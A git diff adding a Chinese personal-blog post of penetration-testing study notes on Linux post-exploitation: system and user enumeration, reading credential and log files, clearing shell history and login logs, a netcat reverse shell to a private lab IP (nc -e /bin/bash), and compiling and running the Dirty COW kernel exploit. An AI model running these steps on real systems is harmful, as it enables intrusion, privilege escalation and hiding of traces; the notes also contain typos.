@@ -258,6 +258,358 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="John Doe">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/hearder.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="South'D 的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" itemprop="url">linux内网信息收集</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-01-16T02:16:04+08:00">
+                2020-01-16
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%86%85%E7%BD%91/" itemprop="url" rel="index">
+                    <span itemprop="name">内网</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="linux机器信息收集"><a href="#linux机器信息收集" class="headerlink" title="linux机器信息收集"></a>linux机器信息收集</h1><p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578446238210.png" alt="1578446238210"></p>
+<h2 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h2><table>
+<thead>
+<tr>
+<th>ifconfig</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>route</td>
+<td>查看路由</td>
+</tr>
+<tr>
+<td>whoami或id</td>
+<td>查看当前用户id</td>
+</tr>
+<tr>
+<td>id test</td>
+<td>查看test用户信息</td>
+</tr>
+<tr>
+<td>w</td>
+<td>查看当前系统活动用户</td>
+</tr>
+<tr>
+<td>lastlog</td>
+<td>查看用户登录日志</td>
+</tr>
+<tr>
+<td>grep MemTotal/porc/meminfo</td>
+<td>查看系统内存总量</td>
+</tr>
+</tbody></table>
+<p>linux下所有的东西都是文件（以文件形式存在）</p>
+<p>proc（系统硬件的东西）</p>
+<h3 id="用户列表"><a href="#用户列表" class="headerlink" title="用户列表"></a>用户列表</h3><p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578446927925.png" alt="1578446927925"></p>
+<table>
+<thead>
+<tr>
+<th>查看用户列表</th>
+<th>cat/etc/passwd</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查看用户组</td>
+<td>cat/etc/group</td>
+</tr>
+<tr>
+<td>列出超级用户</td>
+<td>grep -v -E “^#” /etc/passwd|awk -F: ‘$3 == 0 {print $1}’</td>
+</tr>
+<tr>
+<td>列出超级用户</td>
+<td>awk -F: ‘($3 == “0”) {print}’ /etc/passwd</td>
+</tr>
+</tbody></table>
+<p>awk审计工具</p>
+<p>大于1000，后来新增的机器</p>
+<h3 id="端口列表"><a href="#端口列表" class="headerlink" title="端口列表"></a>端口列表</h3><table>
+<thead>
+<tr>
+<th>netstat -an</th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>netstat -antlp</td>
+<td>查看tcp连接</td>
+</tr>
+</tbody></table>
+<p>查看pid（进程），需要啊root权限才可以看</p>
+<h3 id="系统类型和内核版本"><a href="#系统类型和内核版本" class="headerlink" title="系统类型和内核版本"></a>系统类型和内核版本</h3><table>
+<thead>
+<tr>
+<th>查看系统名称</th>
+<th>cat/etc/issue</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查看系统名称、版本号</td>
+<td>cat/etc/lsb-release</td>
+</tr>
+<tr>
+<td>查看内核信息</td>
+<td>uname -a</td>
+</tr>
+<tr>
+<td>查看内核信息</td>
+<td>ls /root | grep vmlinuz</td>
+</tr>
+</tbody></table>
+<p>前两个查看出来是发行版本</p>
+<p>uname -a查看出是内核版本</p>
+<h3 id="进程信息"><a href="#进程信息" class="headerlink" title="进程信息"></a>进程信息</h3><p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578447727096.png" alt="1578447727096"></p>
+<p>ps aux命令下的参数以及其代表意思</p>
+<table>
+<thead>
+<tr>
+<th>PID</th>
+<th>%CPU</th>
+<th>%MEM</th>
+<th>VSZ</th>
+<th>RSS</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>进程号</td>
+<td>cpu占用</td>
+<td>内存使用率</td>
+<td>总虚拟内存大小,</td>
+<td>常驻集大小</td>
+</tr>
+<tr>
+<td>TTY</td>
+<td>STAT</td>
+<td>START</td>
+<td>TMIE</td>
+<td>COMMAND</td>
+</tr>
+<tr>
+<td></td>
+<td>进程状态</td>
+<td>行程开始时间</td>
+<td>执行时间</td>
+<td>所执行的指令的名称和参数</td>
+</tr>
+</tbody></table>
+<p>上面查看的java号（pid），可以查看它进程</p>
+<p>单独使用ps （ps下面有很多命令用法，可以ps –help查看）</p>
+<h3 id="安装的软件包和服务"><a href="#安装的软件包和服务" class="headerlink" title="安装的软件包和服务"></a>安装的软件包和服务</h3><table>
+<thead>
+<tr>
+<th>查看安装的软件包</th>
+<th>dpkg -l</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>查看安装的软件包</td>
+<td>rpm -qa</td>
+</tr>
+<tr>
+<td>查看系统存在的服务</td>
+<td>cat /etc/service</td>
+</tr>
+</tbody></table>
+<p>service 命令</p>
+<h3 id="服务配置"><a href="#服务配置" class="headerlink" title="服务配置"></a>服务配置</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;syslog.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;chttp.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;lighttpd.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;cups&#x2F;cupsd.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;inetd.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;apache2&#x2F;apache2.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;my.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line"></span><br><span class="line">cat &#x2F;etc&#x2F;lampp&#x2F;etc&#x2F;httpd.conf</span><br></pre></td></tr></table></figure>
+
+<p>linux下的服务配置都带d</p>
+<h3 id="痕迹清理（后面的模块）"><a href="#痕迹清理（后面的模块）" class="headerlink" title="痕迹清理（后面的模块）"></a>痕迹清理（后面的模块）</h3><p>btmp</p>
+<p>wtmp（登录日志）</p>
+<p>history  （history -c 清理历史记录）这时按up就没有上一条命令的记录了</p>
+<p>还要清理bash_history</p>
+<h3 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h3><table>
+<thead>
+<tr>
+<th>网卡配置</th>
+<th>cat /etc/network/interfaces</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>dns配置</td>
+<td>cat /etc/resolv.conf</td>
+</tr>
+<tr>
+<td>查看主机名</td>
+<td>hostname</td>
+</tr>
+</tbody></table>
+<p>启动网卡 ifup ens‘数字’</p>
+<p>关闭网卡 ifdown ens‘数字’</p>
+<p>vim /etc/network/interfaces</p>
+<p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578449879368.png" alt="1578449879368"></p>
+<p>dhcp自动模式(不能获取静态ip）</p>
+<p>static手动模式</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">iface ens38 inet static</span><br><span class="line">address 192.168.5.200（随便找一个不占用的ip）</span><br><span class="line">netmask 255.255.255.0</span><br><span class="line">gateway 192.169.5.1(网关)</span><br></pre></td></tr></table></figure>
+
+<p>重启cat/etc/network/interfaces查看</p>
+<h3 id="网络拓扑收集"><a href="#网络拓扑收集" class="headerlink" title="网络拓扑收集"></a>网络拓扑收集</h3><p>arp -a</p>
+<h3 id="用户登录信息收集"><a href="#用户登录信息收集" class="headerlink" title="用户登录信息收集"></a>用户登录信息收集</h3><p>/var/log/wtmp</p>
+<p>/var/log/btmop</p>
+<h3 id="日志信息收集"><a href="#日志信息收集" class="headerlink" title="日志信息收集"></a>日志信息收集</h3><p>/var/log/*</p>
+<p>http日志：/var/log/apache2/access.log</p>
+<p>mysql日志：/var/log/mysql/error.log</p>
+<p>apt日志：cat /var/log/apt</p>
+<h2 id="linuxt提权"><a href="#linuxt提权" class="headerlink" title="linuxt提权"></a>linuxt提权</h2><p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578463534064.png" alt="1578463534064"></p>
+<p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578463559504.png" alt="1578463559504"></p>
+<p>nc -lvvp 8000</p>
+<p>apt netcat</p>
+<p>chomd a+x netcat  修改权限</p>
+<p>nc -e /bin/sh ip +端口</p>
+<p>linux查看ip快捷：ip a   ==  ifconfig</p>
+<h3 id="kali反弹ubuntu"><a href="#kali反弹ubuntu" class="headerlink" title="kali反弹ubuntu"></a>kali反弹ubuntu</h3><p>1、先在kali中输入nc，看看是否存在</p>
+<p>2、检查ubuntu中的nc是否存在，设置监听：nc -lvvp 8000</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">l是listen vv代表可视化 p表示端口</span><br></pre></td></tr></table></figure>
+
+<p> 3、被控制端（kali）输入</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e &#x2F;bin&#x2F;bash 192.168.139.210 8000(这个ip是ubuntu的ip)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>gcc  linux下的编辑器</p>
+<p>nc</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ls(查看目录)</span><br><span class="line">echo hello world &gt; test.txt (创建一个叫hello world ，test.txt类型的文档)</span><br><span class="line">chmod 404 test.txt（添加权限）</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578497055011.png" alt="1578497055011"></p>
+<p>gcc -pthread dirtyc0w.c -o dirtyc0w./</p>
+<p>is -al</p>
+<p>./dirtyc0w test.txt 1111111111</p>
+<p>procselfmem 900000000</p>
+<p><img src="/2020/01/16/linux%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/C:%5CUsers%5C0%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1578500603578.png" alt="1578500603578"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/14/windows%E6%9C%BA%E5%99%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -807,7 +1159,7 @@
               
                 <a href="/archives/%7C%7C%20archive">
               
-                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-count">13</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -829,7 +1181,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-count">7</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
